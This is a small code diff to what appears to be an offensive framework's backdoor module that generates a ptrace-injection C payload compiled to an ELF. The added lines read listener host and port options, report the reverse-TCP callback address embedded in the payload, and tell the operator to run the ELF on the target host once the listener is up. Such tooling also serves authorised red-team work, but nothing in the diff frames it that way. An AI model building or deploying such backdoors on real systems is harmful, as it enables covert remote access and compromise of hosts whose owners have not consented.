@@ -70,5 +70,9 @@ class Module(Backdoor):
             save_source_name="ptrace_inject.c",
         )
         if ok:
+            lhost = str(option_value(self, "lhost") or "127.0.0.1")
+            lport = int(option_value(self, "lport") or 4444)
             print_info(f"Target cmd: {option_value(self, 'target_cmd')} | Cipher: {option_value(self, 'cipher')}")
+            print_info(f"Embedded callback: {lhost}:{lport} (must match a running reverse_tcp listener)")
+            print_info("Run the generated ELF on the target host after starting the listener.")
         return ok
